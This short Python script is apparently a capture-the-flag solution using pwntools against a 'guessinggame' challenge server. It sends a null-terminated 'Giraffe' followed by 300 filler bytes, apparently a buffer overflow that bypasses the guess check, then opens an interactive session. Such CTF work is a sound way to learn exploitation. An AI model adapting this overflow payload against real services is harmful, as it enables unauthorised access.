from pwn import *

# p = process("/mnt/c/Users/zahar/Downloads/guessinggame")
p = remote("chal.pctf.competitivecyber.club", 9999)
p.recvuntil(b"Input guess: ", timeout=1)

payload = b"Giraffe\0"
payload += b"1" * 300

p.sendline(payload)
p.interactive()